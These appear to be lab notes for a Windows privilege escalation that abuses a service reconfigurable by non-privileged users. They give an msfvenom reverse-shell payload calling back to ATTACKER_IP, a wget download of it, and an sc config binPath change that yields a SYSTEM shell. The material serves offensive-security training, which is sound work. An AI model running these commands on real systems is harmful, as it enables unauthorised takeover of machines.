# Insecure Service Permissions

### Objective:

- Exploit services that can be reconfigured by non-privileged users.

### Vulnerability Overview :

- Administrators may grant service configuration permissions to non-privileged users. An attacker can abuse these permissions to modify the service binary path and replace it with a malicious executable.

### Required condition:

The attacker must have **SERVICE_CHANGE_CONFIG** permission on the target service.

### Enumeration / Discovery:

- We should check the permissions (DACLs) of each service .
- We can use that command :  `accesschk64.exe -ucqv service_name`

### Exploitation Steps :

1. **Generate the malicious payload :**
- We use msfvenom to generate a malicious payload to get a reverse tcp shell :

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe`

![image.png](Insecure%20Service%20Permissions/image.png)

1. **Transfer the payload to the target :**
- Lunch an http server on the attacker vm with : `python3 -m http.server`
- Downald the the malicious payload on the target :

 `wget http://ATTACKER_IP:8000/rev-svc3.exe -O rev-svc3.exe`

![image.png](Insecure%20Service%20Permissions/image%201.png)

1. **Reconfigure the vulnerable Windows service:**
- Since the service already runs as LocalSystem, modifying the binPath is enough to obtain a SYSTEM shell.

`sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe"`

1. **Restart the service :** 
- we stop and start the service so the payload get executed and we can get the reverse shell as a result :

![image.png](Insecure%20Service%20Permissions/image%202.png)

### Key Takeaways :

While enumerating Windows services, always inspect service DACLs to identify dangerous permissions such as SERVICE_CHANGE_CONFIG.
